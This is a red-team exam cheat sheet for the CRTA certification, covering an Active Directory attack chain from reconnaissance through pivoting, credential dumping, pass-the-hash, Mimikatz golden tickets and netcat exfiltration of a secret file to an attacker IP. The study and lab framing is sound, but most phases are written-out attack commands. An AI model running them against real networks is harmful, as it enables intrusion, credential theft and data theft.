## 🔴 CRTA Cheatsheet 🔴

## 🧭 Phase 1 – Initial Recon (External/Perimeter)

### Context  
Initial reconnaissance focuses on identifying live hosts and open services in the target range to plan next steps with minimal noise.

### Techniques  
- Ping sweep to detect live hosts (ICMP).  
- Full port scan with service version detection.  
- Automated recon for efficiency and clean reports.

### Commands  
```bash
# Discover live hosts with ping sweep
nmap -sn <IP_range>

# Full port scan + version detection, output to file
nmap -p- -T4 -sV -oN scan.txt <IP>

# Automated recon (nmap + scripts + brute force)
autorecon.py
````  

## 🔓 Phase 2 – Initial Access (Exploitation)
Context: Look for exploitable vulnerabilities or misconfigurations to gain initial foothold on target machines.

Techniques:
- Exploit known backdoors (e.g., vsftpd 2.3.4).
- Prepare listeners for reverse shells.
- Search for plaintext credentials in common file locations.

Commands:
```bash
# Exploit vsftpd 2.3.4 backdoor using nmap script
nmap --script ftp-vsftpd-backdoor.nse -p 21 <IP>

# Set up a listener for reverse shell
nc -lnvp <port>

# Search for passwords in user directories
grep -ri password /home/*
Tools:

nmap scripts – Automated exploit scanning.

netcat (nc) – Listener and shell connections.
```
##  🔁Phase 3 – Pivoting (Cross-Subnet Movement)

Context: Use compromised hosts to access networks or subnets that are otherwise unreachable.

Techniques:
- Create SOCKS5 tunnels via SSH.
- Use proxychains to redirect traffic through tunnels.

Commands:
```bash
# Establish SOCKS5 proxy tunnel
ssh -D 1080 user@pivot_host

# Add SOCKS5 proxy to proxychains config
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
```
Tools:

SSH – Dynamic port forwarding.

proxychains – Force tools to use SOCKS5 proxy.
## 🔍 Phase 4 – Internal Recon (Windows / AD Environment)

Context: Identify Domain Controllers and key services within the AD environment to prepare targeted attacks.

Techniques:
- Scan common DC ports (Kerberos, LDAP, SMB, GC).
- Identify admin services like WinRM and RDP.

Commands:
```bash
# Scan typical Domain Controller ports
nmap -p 88,389,636,445,3268 <IP>

# Full port and service version scan
nmap -p- -sV -T4 <IP>
```
Tools:

nmap

## 🧑‍💻 Phase 5 – Abuse Web Interfaces / Internal Panels

Context: Gain access to internal admin web panels (e.g., Webmin, Cockpit) via tunneled browsing and escalate privileges.

Techniques:
- Access web interfaces through proxychains tunnels.
- Escalate privileges with sudo if possible.

Commands:
```bash
# Browse internal web services
proxychains firefox http://<target_IP>:<port>

# Privilege escalation if sudo permitted
sudo /bin/bash
```
Tools:

Firefox + proxychains

sudo



## 🗝️Phase 6 – Credential Extraction

Context: Extract credentials or hashes for lateral movement or privilege escalation.

Techniques:
- Decrypt Kerberos keytab files to obtain NTLM hashes.
- Dump credentials from memory or system files.

Commands:
```bash
# Extract NTLM hashes from .keytab files
KeyTabExtract.py <file.keytab>
```
Tools:

KeyTabExtract.py

Mimikatz (see Phase 9)

## 📡 Phase 7 – Lateral Movement

Context: Move across the domain using obtained hashes or credentials to expand access.

Techniques:
- Use NTLM hashes to authenticate without passwords.
- Dump stored hashes from compromised hosts.

Commands:
```bash
# Validate SMB access with NTLM hash
crackmapexec smb <IP> -u <user> -H <NTLM_hash>

# Dump hashes with secretsdump.py (Impacket)
secretsdump.py <target>
```
Tools:

crackmapexec

secretsdump.py (Impacket)

## 🧬 Phase 8 – Advanced Pivoting with Ligolo-ng

Context: Create reversible VPN-like tunnels for persistent pivoting and routing through segmented networks.

Techniques:
- Run Ligolo proxy on attacker machine.
- Execute Ligolo agent on victim for reverse connection.
- Add routes to access internal networks via tunnel.

Commands:
```bash
# Start Ligolo proxy server
./proxy -selfcert

# Run Ligolo agent on victim (PowerShell)
agent.exe -connect <attacker_IP>:11601 -ignore-cert

# Add route via Ligolo tunnel
ip route add <target_IP> dev ligolo
```
Tools:

Ligolo-ng

## 🎫 Phase 9 – Golden Ticket Attack (Persistence + Domain Admin)

Context: Forge Kerberos tickets to maintain indefinite Domain Admin access.

Techniques:
- Clear current tickets to avoid conflicts.
- Use Mimikatz to create forged Golden Tickets.

Commands:
```powershell
# Purge existing Kerberos tickets
klist purge

# Generate Golden Ticket in Mimikatz
lsadump::trust /patch
kerberos::golden /user:child-admin /domain:redteam.corp /sid:<SID> /krbtgt:<hash>
```
Tools:

Mimikatz

## 📤 Phase 10 – Data Exfiltration

Context: Find and transfer sensitive files out of the target environment.

Techniques:
- Search for files containing secrets.
- Use netcat for stealthy file transfer.

Commands:
```bash
# Find files with sensitive keywords
find / -type f -iname "*secret*.xml"

# Listen on attacker for incoming file
nc -l -p 1235 > secret.xml

# Send file from victim (PowerShell)
type C:\path\secret.xml | nc <attacker_IP> 1235
```
Tools:

netcat
## 🧠 Summary: Mastering the Active Directory Red Team Engagement

This cheat sheet is a practical guide to performing a full-scope red team operation against an Active Directory environment. Each phase builds on the previous one, and success comes from not just knowing commands—but understanding the context and adapting based on the target network.

---

### 🧭 Key Phases Overview

| Phase | Goal |
|-------|------|
| Phase 1 | Initial Recon: Identify hosts and services externally |
| Phase 2 | Initial Access: Exploit vulnerabilities or misconfigs |
| Phase 3 | Pivoting: Reach internal subnets through tunnels |
| Phase 4 | Internal Recon: Map the AD environment |
| Phase 5 | Abuse Internal Panels: Access internal admin UIs |
| Phase 6 | Credential Extraction: Extract hashes and passwords |
| Phase 7 | Lateral Movement: Expand control across machines |
| Phase 8 | Advanced Pivoting: Use Ligolo for robust tunneling |
| Phase 9 | Golden Ticket: Achieve persistent Domain Admin access |
| Phase 10 | Exfiltration: Steal and extract valuable data |

---

## 🛠️ Advice and Best Practices

### 🧠 Think Like an Attacker  
Don't just memorize commands—ask *why* each one is used. Understand the purpose behind every technique so you can adapt to different environments.

### 🧪 Practice in Labs  
Set up a lab with real Windows machines and an Active Directory domain. Use platforms like:
- [HackTheBox](https://www.hackthebox.com)
- [TryHackMe](https://tryhackme.com)
- Your own virtual lab (e.g., AD + Kali on VirtualBox or Proxmox)

### 📸 Document Everything  
In real engagements and exams like CRTA, you must:
- Take **screenshots** of every relevant step.
- Keep terminal output logs and timestamps.
- Explain *what* you did and *why*.
- Create a clear **report** showing the full attack path.

> 🎯 **Exam Tip:** The goal is often to extract the file `secrets.xml` or similar sensitive artifacts. Build your process around finding and exfiltrating that final objective.

### 📚 Learn the Tools  
Spend time learning how each tool works under the hood:
- `nmap` and its scripts
- `proxychains` and tunneling techniques
- `crackmapexec`, `impacket`, `mimikatz`
- `Ligolo-ng`, `netcat`, `autorecon`

### 📋 Take Notes  
During exams or engagements, keep notes of:
- IPs, ports, usernames, hashes
- Tools used and exact command syntax
- Timeline of actions (this helps in reports)

### 🚨 Stay Quiet  
Avoid noisy scans. Use `-T2` timing in `nmap`, avoid default usernames, and test tools in low-noise ways first.

### 🔒 Clean Up  
After engagements or tests, remove any artifacts (listeners, dropped files, tickets). Don’t leave traces.

---

## ✅ Final Tip

🔁 **Repetition and real-world simulation is key.** Go through this cheat sheet repeatedly until every phase becomes second nature. The more you internalize the *why* and *how*, the better you'll perform in actual red team scenarios or exams like CRTA.

Happy hacking!⚔️

By: @blindma1den


